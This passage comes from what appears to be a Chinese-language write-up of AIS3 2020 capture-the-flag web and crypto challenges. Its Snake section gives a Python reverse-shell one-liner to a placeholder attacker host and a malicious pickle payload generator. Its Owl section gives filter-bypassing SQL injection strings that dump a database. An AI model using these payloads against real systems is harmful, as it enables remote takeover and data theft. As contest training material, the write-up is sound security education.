<p>看起來首先會先設置 Cookie 然後再導回至首頁，不過這 Cookie 看起來似乎有點… 似曾相識？我們透過 Fiddler 的 TextWizard 來看看解不解地出來。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/PABvoAJ.png" alt="" /></p>

<p>啊哈！看起來是 Base64 呢！而且看起來是某種序列化後的結果。我們來查查 <a href="https://www.php.net/manual/en/function.serialize.php">PHP 的 Serialization 相關文件</a>。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?
/*
Anatomy of a serialize()'ed value:

String
s:size:value;

Integer
i:value;

Boolean
b:value; (does not store "true" or "false", does store '1' or '0')

Null
N;

Array
a:size:{key definition;value definition;(repeated per element)}

Object
O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}

String values are always in double quotes
Array keys are always integers or strings
    "null =&gt; 'value'" equates to 's:0:"";s:5:"value";',
    "true =&gt; 'value'" equates to 'i:1;s:5:"value";',
    "false =&gt; 'value'" equates to 'i:0;s:5:"value";',
    "array(whatever the contents) =&gt; 'value'" equates to an "illegal offset type" warning because you can't use an
    array as a key; however, if you use a variable containing an array as a key, it will equate to 's:5:"Array";s:5:"value";',
     and
    attempting to use an object as a key will result in the same behavior as using an array will.
*/
?&gt;
</code></pre></div></div>

<p>我們可以從中推出這個原本是一個 <code class="language-plaintext highlighter-rouge">User</code> class，然後其中的 Properties 有 <code class="language-plaintext highlighter-rouge">[0x00]User[0x00]Token</code> 及 <code class="language-plaintext highlighter-rouge">name</code>。但是我們知道了這點又能怎樣？我在打的時候有試過將 username 換為 <code class="language-plaintext highlighter-rouge">admin</code> 等字眼，但想也知道不會通，因為我們登入的時候就可以打 <code class="language-plaintext highlighter-rouge">admin</code> 啦？</p>

<p>我的另外的想法是如果我讓他噴錯或無法反序列化會怎麼樣？所以我把序列化的 Payload 改成以下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"User":0:{}
</code></pre></div></div>

<p>再將其 Base64 設成 Cookie 後再送出。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/1ZjBBkt.jpg" alt="" /></p>

<p>然後 Flag 就莫名其妙噴出來了(X)。其實我不是很懂這題在考我們什麼，是在考我們PHP序列化後的data長什麼樣嗎？我其實滿好奇的。</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}</code></p>

<h3 id="-snake-272-pt">🐍 Snake (272 pt.)</h3>

<p>Snake 的連結一開起來會看到以下原始碼：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">import</span> <span class="nn">pickle</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="n">traceback</span>

<span class="n">Response</span><span class="p">.</span><span class="n">default_mimetype</span> <span class="o">=</span> <span class="s">'text/plain'</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">values</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'data'</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            
            <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
                <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/flag'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">traceback</span><span class="p">.</span><span class="n">format_exc</span><span class="p">()</span>
        
    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
</code></pre></div></div>

<p>雖然之前沒碰過 Flask，可是這題很明顯不需要知道 Flask，因為一看就知道這題最大的問題是 Pickle (L15)。 <code class="language-plaintext highlighter-rouge">pickle.loads</code> 可以說是非常危險的一個 call，甚至連<a href="https://docs.python.org/3/library/pickle.html">官方文件</a>都這麼寫：</p>

<blockquote class="notice--danger">
  <p>The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
</blockquote>

<p>既然我們知道有可能可以進行 ACE (Arbitrary Code Execution)，那我們就來寫寫看我們的 payload。對我們來說既然知道能進行 ACE，最方便的方式就是寫個 Reverse Shell 到人家電腦上搗亂。</p>

<div class="notice--info">
  
<p>延伸閱讀：</p>
<ul>
  <li><a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">Exploiting Python pickles</a></li>
  <li><a href="/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf">Security Issues in Python Pickle</a></li>
  <li><a href="https://root4loot.com/post/exploiting_cpickle/">Pickle Arbitrary Code Execution</a></li>
</ul>

</div>

<p>透過一些延伸閱讀，出了下列指令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys,socket,os,pty;s=socket.socket();s.connect((AttackerIP, AttackPort));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">type</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">list</span>
    <span class="n">payload_prefix</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'''(('''</span>
    <span class="n">payload_suffix</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'''lisubprocess</span><span class="se">\n</span><span class="s">Popen</span><span class="se">\n</span><span class="s">.'''</span>
    <span class="n">payload_body</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
        <span class="n">payload_body</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"X"</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_prefix</span> <span class="o">+</span> <span class="n">payload_body</span> <span class="o">+</span> <span class="n">payload_suffix</span>
    <span class="k">assert</span> <span class="sa">b</span><span class="s">'R'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">([</span>
        <span class="s">"python"</span><span class="p">,</span>
        <span class="s">"-c"</span><span class="p">,</span>
        <span class="n">command</span>
    <span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</code></pre></div></div>

<p>在本地端設定好netcat，將其Base64 output丟回至伺服器中，就成功拿到了對方電腦的 Shell!</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/C7JcqEm.png" alt="" /></p>

<p><img src="/assets/images/posts/ais3-2020-writeup/BkFNr6O.png" alt="" /></p>

<p>這題我還滿喜歡的，這告訴了大家 <code class="language-plaintext highlighter-rouge">pickle.loads</code> 是個多麼危險的東西。</p>

<h3 id="-rhino-494-pt">🦏 Rhino (494 pt.)</h3>

<p>Rhino 這題從 HTML head 就可以看出來是 Jekyll 出來的靜態網站，所以再怎麼戳這網站也不會噴出什麼奇怪東西的。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Begin Jekyll SEO tag v2.6.1 --&gt;</span>
<span class="nt">&lt;title&gt;</span>A Lonely Programmer | As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"generator"</span> <span class="na">content=</span><span class="s">"Jekyll v4.0.1"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:title"</span> <span class="na">content=</span><span class="s">"A Lonely Programmer"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:locale"</span> <span class="na">content=</span><span class="s">"en_US"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">"As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino."</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:description"</span> <span class="na">content=</span><span class="s">"As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino."</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"canonical"</span> <span class="na">href=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:url"</span> <span class="na">content=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">"og:site_name"</span> <span class="na">content=</span><span class="s">"A Lonely Programmer"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"application/ld+json"</span><span class="nt">&gt;</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">headline</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">A Lonely Programmer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">As you can see in the title, I am a lonely programmer. My favorite programming language is JavaScript and my favorite animal is rhino.</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">A Lonely Programmer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">@type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">WebSite</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">@context</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">https://schema.org</span><span class="dl">"</span><span class="p">}</span><span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- End Jekyll SEO tag --&gt;</span>
</code></pre></div></div>

<p>那就… 網站起手式先看看 robots.txt/humans.txt 有沒有東西囉？</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/rSmNxmC.png" alt="" /></p>

<p>其實當下滿意外會有的，畢竟是考到爛的提示(X)，但這給了我們許多相關需要知道的東西。</p>

<ul>
  <li>這個網站是 Node.JS 當基底的 (<code class="language-plaintext highlighter-rouge">node_modules</code>)</li>
  <li>根目錄下<em>可能</em>有 .js 及 .json 及 .xml 檔</li>
  <li>有 flag.txt
    <ul>
      <li>想也知道網站不可能這麼容易就給我們 flag 的</li>
    </ul>
  </li>
</ul>

<p>那我們既然知道是 Node-based，那我們來戳戳看有沒有 <code class="language-plaintext highlighter-rouge">package.json</code>。</p>

<pre><code class="language-jsonld">{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "node chill.js",
    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1"
  },
  "author": "djosix",
  "license": "ISC",
  "dependencies": {
    "cookie-session": "^1.4.0",
    "express": "^4.17.1"
  }
}
</code></pre>

<p>有欸！主程式是在 <code class="language-plaintext highlighter-rouge">chill.js</code>，我們來看看那個裡面是什麼？</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-session</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
  <span class="na">secret</span><span class="p">:</span> <span class="dl">"</span><span class="s2">I'm watching you.</span><span class="dl">"</span>
<span class="p">}));</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kd">static</span><span class="p">(</span><span class="dl">'</span><span class="s1">./</span><span class="dl">'</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag.txt</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">text/plain</span><span class="dl">'</span><span class="p">);</span>

  <span class="kd">let</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">magic</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">420</span><span class="p">)</span> <span class="o">===</span> <span class="mi">420</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">you are a sad person too</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">sendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">404.html</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">root</span><span class="p">:</span> <span class="nx">__dirname</span> <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0.0.0.0</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>看起來我們得自行找出一個有被 <code class="language-plaintext highlighter-rouge">I'm watching you.</code> 簽章的 Cookie 而且 <code class="language-plaintext highlighter-rouge">magic</code> 值還必須不等於 0 可是跟 420 相加時還得要 420。</p>

<p>我們晚點再處理 <code class="language-plaintext highlighter-rouge">cookie-session</code> 因為那個好處理，在地方端執行一次就好。我們先看到底要怎樣才能讓 <code class="language-plaintext highlighter-rouge">req.session.magic</code> 變成一個符合期望的值。我一開始的想法是試試看能不能把 <code class="language-plaintext highlighter-rouge">magic</code> 指派為一個 JavaScript object然後override <code class="language-plaintext highlighter-rouge">ToString</code>/<code class="language-plaintext highlighter-rouge">toPrimitive</code>。很可惜的，不管怎麼改，回傳的 Cookie 永遠不會把 JS Object 丟回來。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/CRNHLxU.png" alt="" /></p>

<p>這題我想了很久，我開始想說會不會是在考 JS 的其他型態，而跟 JS Object 沒什麼關係？所以我開始丟了各種型態進 Node CLI 試試看到底什麼型態下會成立。然後我就很黑箱的方式不小心猜到了(?)。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/5vsA3MB.png" alt="" /></p>

<div class="notice--info">
  
<p>延伸閱讀：</p>
<ul>
  <li><a href="https://www.w3schools.com/js/js_numbers.asp">JavaScript Numbers (w3schools)</a></li>
  <li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number">Number - JavaScript (MDN)</a></li>
</ul>

</div>

<p>原來問題是在 JavaScript 其實並沒有所謂 <code class="language-plaintext highlighter-rouge">double</code>/<code class="language-plaintext highlighter-rouge">decimal</code>/<code class="language-plaintext highlighter-rouge">int</code>/<code class="language-plaintext highlighter-rouge">float</code> 這些數字型態的差別，全部都是 <code class="language-plaintext highlighter-rouge">Number</code>。透過延伸閱讀，我們發現 JavaScript 其實跟我一樣，數學很差。</p>

<blockquote>
  <p>The maximum number of decimals is 17, but floating point arithmetic is not always 100% accurate</p>
</blockquote>

<p>數字一旦太多小數點就會開始不準，這時再進行加減就很容易出現一些我們認為不該出現的東西。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mf">0.2</span> <span class="o">+</span> <span class="mf">0.1</span><span class="p">;</span>         <span class="c1">// x will be 0.30000000000000004</span>
</code></pre></div></div>

<p>所以在知道這一切之後我們就可以從地方端把 <code class="language-plaintext highlighter-rouge">req.session.magic</code> 改成 <code class="language-plaintext highlighter-rouge">Number.MIN_VALUE</code> 然後丟出去拿我們的 Cookie。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/v5en4m4.png" alt="" /></p>

<p>所以我們所需要拿 flag 的 Cookie 就是:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==; path=/; httponly
Set-Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ; path=/; httponly
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl https://rhino.ais3.org/flag.txt <span class="nt">-H</span> <span class="s2">"Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==;"</span> <span class="nt">-H</span> <span class="s2">"Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ;"</span>
AIS3<span class="o">{</span>h4v3_y0u_r34d_7h3_rh1n0_b00k?<span class="o">}</span>
</code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}</code></p>

<h3 id="-owl-492-pt">🦉 Owl (492 pt.)</h3>

<blockquote>
  <p>Flag is inside the database.</p>
  <ul>
    <li>There’s a hint in the webpage</li>
    <li>This is a hybridge challenge with Turtle in Crypto</li>
  </ul>
</blockquote>

<p>一開始看到 Crypto 我的反應: (っ °Д °;)っ
畢竟我對密碼學的東西感到非常恐慌，數學相關的東西都爛爆，但後來仔細看其實發現好像沒有太大關係。第一件事就是開Fiddler看中間的請求跟回應。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
16	200	HTTPS	turtowl.ais3.org	/?action=login	86	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224			
21	200	HTTPS	turtowl.ais3.org	/	716	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224
</code></pre></div></div>

<p><img src="/assets/images/posts/ais3-2020-writeup/JehCCWQ.png" alt="" /></p>

<p>我們發現它會把我們導向至 <code class="language-plaintext highlighter-rouge">https://turtowl.ais3.org/?action=login</code> 並將我們的登入資訊 POST 過去，如果資料不對的話會噴錯然後把我們丟回到登入頁面。提示提到 <code class="language-plaintext highlighter-rouge">GUESS THE STUPID USERNAME / PASSWORD</code>，所以大概是弱密碼…? AIS3 應該不太可能出那麼OO的題目，所以應該還有。我們透過 <code class="language-plaintext highlighter-rouge">admin/admin</code> 登入進來之後看到以下：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>🦉🦉🦉🦉<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">'utf-8'</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">id=</span><span class="s">"bootstrap-css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
            <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-center text-white pt-5"</span><span class="nt">&gt;&lt;a</span> <span class="na">style=</span><span class="s">"color: white"</span> <span class="na">href=</span><span class="s">"/?source"</span><span class="nt">&gt;</span>SHOW HINT<span class="nt">&lt;/a&gt;&lt;/h3&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row justify-content-center align-items-center"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-12"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-center text-info"</span><span class="nt">&gt;</span>Nothing<span class="nt">&lt;/h3&gt;</span>
                        Hello, <span class="nt">&lt;b&gt;</span>admin<span class="nt">&lt;/b&gt;</span>, nothing here.
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?action=logout"</span><span class="nt">&gt;</span>Logout!<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>

<p>裡面的提示提到了 <code class="language-plaintext highlighter-rouge">https://turtowl.ais3.org/?source</code>，估計是 <code class="language-plaintext highlighter-rouge">index.php</code> 的原始碼。</p>

<p>我們可以看到很有趣的幾點：</p>
<ul>
  <li>CSRF 是由 MD5 隨機數*隨機數當作 Key 產生的</li>
  <li>sqlmap 被擋掉了
    <ul>
      <li>大概是覺得 sqlmap 小孩太多了</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">$username</code> 有特別進行兩次 <code class="language-plaintext highlighter-rouge">str_ireplace</code> 把危險字串移掉
    <ul>
      <li>兩次？</li>
    </ul>
  </li>
  <li>直接執行下列 SQL Statement
    <ul>
      <li><code class="language-plaintext highlighter-rouge">SELECT * FROM users WHERE username = '$username' AND password = '$hash'</code></li>
    </ul>
  </li>
</ul>

<p>很明顯的，主辦希望我們攻擊的點是用戶名，可是我們得先考慮先前的 <code class="language-plaintext highlighter-rouge">str_ireplace</code>。我們該怎麼繞呢？</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/5QL26kj.png" alt="" /></p>

<p>我們知道他會進行兩次替換，那我們在我們字串裡面混一些它會替換的字就好了呀：</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/X6vvgaF.png" alt="" /></p>

<p>那空格怎麼辦？空格也會換掉阿？這時我們可以用換行符號或Tab character替代。所以我們最後的 POST 資料應該是：</p>

<p><code class="language-plaintext highlighter-rouge">username=%27%0Ao-selandect-r%0A1%3D1%3B%2Foselandectr*&amp;password=asdf&amp;csrf_token=$csrfToken</code></p>

<p>這樣我們就成功以 root 登入了！接著就是開始挖資料，我們透過 PHP 原始碼知道 Database 種類是 SQLite3，所以我們可以開始寫我們的SQL Statement。我們從中撈到有個table叫 <code class="language-plaintext highlighter-rouge">garbage</code>，所以我們可以開始看看裡面有什麼。</p>

<p>Column names in table <code class="language-plaintext highlighter-rouge">garbage</code>:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- result: id,name,value,</span>
<span class="c1">-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(name)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Apragma_table_info('garbage');/oselandectr*</span>
<span class="s1">' union all select 256 as id, group_concat(name) as username, </span><span class="se">''</span><span class="s1"> as password from pragma_table_info('</span><span class="n">garbage</span><span class="s1">');/or*
</span></code></pre></div></div>

<p>Values in column <code class="language-plaintext highlighter-rouge">value</code> in table <code class="language-plaintext highlighter-rouge">garbage</code>:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- result: sqlmap is for child,who starts selling weeds,this is the flag: AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c},Im watching you,</span>
<span class="c1">-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(value)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Agarbage;/oselandectr*</span>

<span class="s1">' union all select 256 as id, group_concat(value) as username, </span><span class="se">''</span><span class="s1"> as password from garbage;/or*
</span></code></pre></div></div>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}</code></p>

<h2 id="crypto">Crypto</h2>

<h3 id="-brontosaurus-100-pt">🦕 Brontosaurus (100 pt.)</h3>

<blockquote>
  <p>Brontosaurus peek at last year’s problems with a long neck and picked up “KcufsJ”.</p>
</blockquote>

<p>看到 <code class="language-plaintext highlighter-rouge">KcufsJ</code> 已經腦袋直接想到 JsFuck 了。 JsFuck 是什麼呢？ JsFuck 基本上是由 Brainfuck 這個語言過來的，所以語言非常相似。我們可以直接把它丟到<a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">其他人已經寫好的 Interpreter 實作</a>。</p>

<p>欸？</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/SePFxuz.png" alt="" /></p>

<p>為什麼噴錯？仔細看了一下，原來是主辦很貼心地幫我們把這個字串進行 reverse 了！這時候我們把逆回來再執行一次看看。</p>

<p><img src="/assets/images/posts/ais3-2020-writeup/mVd6oC2.png" alt="" /></p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{Br0n7Os4uru5_ch3at_3asi1Y}</code></p>

<h3 id="-t-rex-100-pt">🦖 T-Rex (100 pt.)</h3>

<blockquote>
  <p>Tyrannosaurus-rex is an nihilist.</p>
</blockquote>

<p>簽到題，照表格進行字串替換即可。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        !       @       #       $       %       &amp;

!       V       F       Y       J       6       1

@       5       0       M       2       9       L

#       I       W       H       S       4       Q

$       K       G       B       X       T       A

%       E       3       C       7       P       N

&amp;       U       Z       8       R       D       O
</code></pre></div></div>

